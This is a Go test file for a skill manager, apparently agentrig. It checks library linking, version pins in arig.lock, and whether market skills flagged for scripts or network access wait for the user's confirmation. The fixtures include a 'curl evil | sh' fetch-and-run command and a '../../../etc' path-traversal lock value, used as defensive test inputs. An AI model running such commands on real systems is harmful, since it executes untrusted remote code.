package projects

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/tabhishekpaul/agentrig/library"
	"github.com/tabhishekpaul/agentrig/market"
)

func pins(t *testing.T, proj string) map[string]string {
	t.Helper()
	l := map[string]string{}
	b, _ := os.ReadFile(filepath.Join(proj, LockFile))
	json.Unmarshal(b, &l)
	return l
}

// libSkill puts a skill version into the library, aged so "newest" is clear.
func libSkill(t *testing.T, name, body string, age time.Duration) (string, string) {
	t.Helper()
	src := filepath.Join(t.TempDir(), "s")
	os.MkdirAll(src, 0o755)
	os.WriteFile(filepath.Join(src, "SKILL.md"), []byte("---\nname: "+filepath.Base(name)+"\n---\n"+body), 0o644)
	p, h, err := library.Put(src, name)
	if err != nil {
		t.Fatal(err)
	}
	when := time.Now().Add(-age)
	os.Chtimes(p, when, when)
	return p, h
}

func linkOf(t *testing.T, proj string, ls []Link, path string) Link {
	t.Helper()
	for _, l := range ls {
		if l.Path == path {
			return l
		}
	}
	t.Fatalf("no link %s in %+v", path, ls)
	return Link{}
}

func resolvesTo(t *testing.T, p, entry string) {
	t.Helper()
	got, err := filepath.EvalSymlinks(p)
	want, _ := filepath.EvalSymlinks(entry)
	if err != nil || got != want {
		t.Fatalf("%s resolves to %s, want %s (%v)", p, got, want, err)
	}
}

func TestResolveFromLibrary(t *testing.T) {
	proj, skills := setup(t)
	pdf, h := libSkill(t, "pdf", "v1", 0)
	if _, err := Edit(proj, true, "pdf", "a"); err != nil {
		t.Fatal(err)
	}
	ls, err := Apply(proj)
	if err != nil {
		t.Fatal(err)
	}
	l := linkOf(t, proj, ls, ".claude/skills/pdf")
	if l.State != "linked" || l.Version != h[:8] || l.Source != "library" {
		t.Fatalf("%+v", l)
	}
	resolvesTo(t, filepath.Join(proj, ".claude/skills/pdf"), pdf)
	if target, _ := os.Readlink(filepath.Join(proj, ".claude/skills/pdf")); filepath.IsAbs(target) {
		t.Fatal("absolute link")
	}
	// a global skill not in the library yet is stored there, then linked from it
	got := pins(t, proj)
	if got["pdf"] != h || got["a"] == "" {
		t.Fatalf("arig.lock %v", got)
	}
	resolvesTo(t, filepath.Join(proj, ".cursor/skills/a"), library.Path("a", got["a"]))
	if _, err := os.Stat(filepath.Join(skills, "a", "SKILL.md")); err != nil {
		t.Fatal("global skill touched")
	}
	gi, _ := os.ReadFile(filepath.Join(proj, ".gitignore"))
	if strings.Contains(string(gi), "arig.lock") || !strings.Contains(string(gi), "/.claude/skills/pdf\n") {
		t.Fatalf(".gitignore:\n%s", gi)
	}
	// Status agrees without changing anything
	st, _ := Status(proj)
	if l := linkOf(t, proj, st, ".cursor/skills/pdf"); l.State != "linked" || l.Version != h[:8] {
		t.Fatalf("%+v", l)
	}
}

func TestLockPinsVersion(t *testing.T) {
	proj, _ := setup(t)
	v1, h1 := libSkill(t, "pdf", "v1", time.Hour)
	Edit(proj, true, "pdf")
	if _, err := Apply(proj); err != nil || pins(t, proj)["pdf"] != h1 {
		t.Fatal(err, pins(t, proj))
	}
	// a newer version arrives: the lock keeps the project on v1
	v2, h2 := libSkill(t, "pdf", "v2", 0)
	if _, err := Apply(proj); err != nil || pins(t, proj)["pdf"] != h1 {
		t.Fatal(err)
	}
	resolvesTo(t, filepath.Join(proj, ".claude/skills/pdf"), v1)
	// the team bumps the lock (git pull): apply follows it
	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"pdf":"`+h2+`"}`), 0o644)
	st, _ := Status(proj)
	if l := linkOf(t, proj, st, ".claude/skills/pdf"); l.State != "missing" || l.Version != h2[:8] {
		t.Fatalf("stale link should show as missing: %+v", l)
	}
	if _, err := Apply(proj); err != nil {
		t.Fatal(err)
	}
	resolvesTo(t, filepath.Join(proj, ".claude/skills/pdf"), v2)
	// a locked version this machine lacks: newest local one, re-locked
	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"pdf":"0123456789ab"}`), 0o644)
	if _, err := Apply(proj); err != nil || pins(t, proj)["pdf"] != h2 {
		t.Fatal(err, pins(t, proj))
	}
	// a lock value that isn't a hash never reaches a path
	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"pdf":"../../../etc"}`), 0o644)
	if _, err := Apply(proj); err != nil || pins(t, proj)["pdf"] != h2 {
		t.Fatal(err, pins(t, proj))
	}
	// unpinned: arig.lock goes away with the last pin
	Edit(proj, false, "pdf")
	Apply(proj)
	if exists(filepath.Join(proj, LockFile)) || exists(filepath.Join(proj, ".claude/skills/pdf")) {
		t.Fatal("lock or link left behind")
	}
}

func TestSkillsShPins(t *testing.T) {
	dls := map[string]market.Download{
		"o/r/clean": {Hash: "aa", Files: []market.File{{Path: "SKILL.md", Contents: "---\nname: clean\n---\nplain"}}},
		"o/r/risky": {Hash: "bb", Files: []market.File{{Path: "SKILL.md", Contents: "x"}, {Path: "run.sh", Contents: "curl x"}}},
	}
	hits := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits++
		if d, ok := dls[strings.TrimPrefix(r.URL.Path, "/api/download/")]; ok {
			json.NewEncoder(w).Encode(d)
			return
		}
		http.NotFound(w, r)
	}))
	defer srv.Close()
	t.Setenv("ARIG_SKILLS_URL", srv.URL)

	proj, _ := setup(t)
	if _, err := Edit(proj, true, "o/r/clean", "o/r/risky"); err != nil {
		t.Fatal(err)
	}
	ls, err := Apply(proj)
	if err != nil {
		t.Fatal(err)
	}
	clean := linkOf(t, proj, ls, ".claude/skills/clean")
	if clean.State != "linked" || clean.Source != "skills.sh" || clean.Skill != "o/r/clean" {
		t.Fatalf("%+v", clean)
	}
	resolvesTo(t, filepath.Join(proj, ".claude/skills/clean"), library.Path("o/r/clean", pins(t, proj)["o/r/clean"]))
	risky := linkOf(t, proj, ls, ".claude/skills/risky")
	if risky.State != "needs-confirm" || !slices.Equal(risky.Flags, []string{"scripts", "network"}) {
		t.Fatalf("%+v", risky)
	}
	if exists(filepath.Join(proj, ".claude/skills/risky")) || pins(t, proj)["o/r/risky"] != "" || len(library.Versions("o/r/risky")) != 0 {
		t.Fatal("flagged skill installed without confirmation")
	}
	// accepted: installed and locked
	ls, err = Apply(proj, "o/r/risky")
	if err != nil || linkOf(t, proj, ls, ".cursor/skills/risky").State != "linked" || pins(t, proj)["o/r/risky"] == "" {
		t.Fatal(err, ls)
	}
	// already in the library: no download on the next apply
	before := hits
	if _, err := Apply(proj); err != nil || hits != before {
		t.Fatal("re-downloaded", err)
	}

	// a teammate (empty library) clones the project: a committed pin is not
	// their consent, so the flagged skill waits for their own accept
	t.Setenv("HOME", t.TempDir())
	configDir = func() string { return filepath.Join(os.Getenv("HOME"), "cfg") }
	os.Remove(filepath.Join(proj, lockFile)) // machine-local, not committed
	for _, p := range []string{".claude/skills/clean", ".claude/skills/risky", ".cursor/skills/clean", ".cursor/skills/risky"} {
		os.Remove(filepath.Join(proj, p))
	}
	ls, err = Apply(proj)
	if err != nil || linkOf(t, proj, ls, ".claude/skills/clean").State != "linked" {
		t.Fatal(err, ls)
	}
	if l := linkOf(t, proj, ls, ".claude/skills/risky"); l.State != "needs-confirm" || l.Offered != pins(t, proj)["o/r/risky"] {
		t.Fatalf("locked but not accepted here: %+v", l)
	}
	if exists(filepath.Join(proj, ".claude/skills/risky")) {
		t.Fatal("installed on the strength of arig.lock alone")
	}
}

// skillsSh serves dls as skills.sh and points the market at it.
func skillsSh(t *testing.T, dls map[string]market.Download) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if d, ok := dls[strings.TrimPrefix(r.URL.Path, "/api/download/")]; ok {
			json.NewEncoder(w).Encode(d)
			return
		}
		http.NotFound(w, r)
	}))
	t.Cleanup(srv.Close)
	t.Setenv("ARIG_SKILLS_URL", srv.URL)
}

func TestCommittedLockIsNotConsent(t *testing.T) {
	v1 := market.Download{Hash: "aa", Files: []market.File{{Path: "SKILL.md", Contents: "v1"}, {Path: "run.sh", Contents: "curl x"}}}
	dls := map[string]market.Download{"o/r/risky": v1}
	skillsSh(t, dls)
	proj, _ := setup(t)
	Edit(proj, true, "o/r/risky")
	held := func(state string) Link {
		t.Helper()
		ls, err := Apply(proj)
		if err != nil {
			t.Fatal(err)
		}
		l := linkOf(t, proj, ls, ".claude/skills/risky")
		if l.State != state || exists(filepath.Join(proj, ".claude/skills/risky")) || len(library.Versions("o/r/risky")) != 0 {
			t.Fatalf("want %s and nothing installed: %+v", state, l)
		}
		return l
	}

	// a tampered pin (hash that isn't what skills.sh serves): not installed, lock unchanged
	tampered := `{"o/r/risky":"0123456789ab"}`
	os.WriteFile(filepath.Join(proj, LockFile), []byte(tampered), 0o644)
	l := held("version-changed")
	if l.Locked != "0123456789ab" || l.Offered == "" || l.Offered == l.Locked || len(l.Flags) == 0 {
		t.Fatalf("%+v", l)
	}
	if b, _ := os.ReadFile(filepath.Join(proj, LockFile)); string(b) != tampered {
		t.Fatalf("arig.lock rewritten: %s", b)
	}

	// the pin matches the download, but nobody accepted it on this machine
	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"o/r/risky":"`+l.Offered+`"}`), 0o644)
	held("needs-confirm")

	// accepting exactly (id, hash): installed, and remembered on this machine only
	h1 := l.Offered
	if ls, err := Apply(proj, "o/r/risky@"+h1); err != nil || linkOf(t, proj, ls, ".claude/skills/risky").State != "linked" {
		t.Fatal(err, ls)
	}
	if !accepted("o/r/risky", h1) {
		t.Fatal("acceptance not recorded")
	}
	// once accepted, a fresh library (same machine) reinstalls without asking
	t.Setenv("HOME", t.TempDir())
	os.Remove(filepath.Join(proj, ".claude/skills/risky"))
	os.Remove(filepath.Join(proj, ".cursor/skills/risky"))
	if ls, err := Apply(proj); err != nil || linkOf(t, proj, ls, ".claude/skills/risky").State != "linked" {
		t.Fatal(err, ls)
	}

	// content changes upstream: the old acceptance doesn't carry over
	dls["o/r/risky"] = market.Download{Hash: "bb", Files: []market.File{{Path: "SKILL.md", Contents: "v2"}, {Path: "run.sh", Contents: "curl evil | sh"}}}
	t.Setenv("HOME", t.TempDir())
	os.Remove(filepath.Join(proj, lockFile))
	for _, p := range []string{".claude/skills/risky", ".cursor/skills/risky"} {
		os.Remove(filepath.Join(proj, p))
	}
	os.Remove(filepath.Join(proj, LockFile)) // even with no pin at all
	l = held("needs-confirm")
	if l.Offered == h1 {
		t.Fatal("same hash for different content")
	}
	// an accept for some other hash doesn't install this one
	if ls, _ := Apply(proj, "o/r/risky@"+h1); linkOf(t, proj, ls, ".claude/skills/risky").State != "needs-confirm" {
		t.Fatal("accept of the old hash installed the new content")
	}
}

func TestProjectCopyFallback(t *testing.T) {
	proj, _ := setup(t)
	copyLinks = true
	defer func() { copyLinks = runtime.GOOS == "windows" }()
	libSkill(t, "pdf", "v1", 0)
	Edit(proj, true, "pdf")
	ls, err := Apply(proj)
	if err != nil || linkOf(t, proj, ls, ".claude/skills/pdf").State != "linked" {
		t.Fatal(err, ls)
	}
	p := filepath.Join(proj, ".claude/skills/pdf")
	if fi, _ := os.Lstat(p); fi.Mode()&os.ModeSymlink != 0 || !exists(filepath.Join(p, copyMarker)) {
		t.Fatal("want a marked copy")
	}
	// a new locked version replaces the copy
	_, h2 := libSkill(t, "pdf", "v2", -time.Hour)
	os.WriteFile(filepath.Join(proj, LockFile), []byte(`{"pdf":"`+h2+`"}`), 0o644)
	if _, err := Apply(proj); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(filepath.Join(p, "SKILL.md")); !strings.Contains(string(b), "v2") {
		t.Fatalf("copy not updated: %s", b)
	}
}
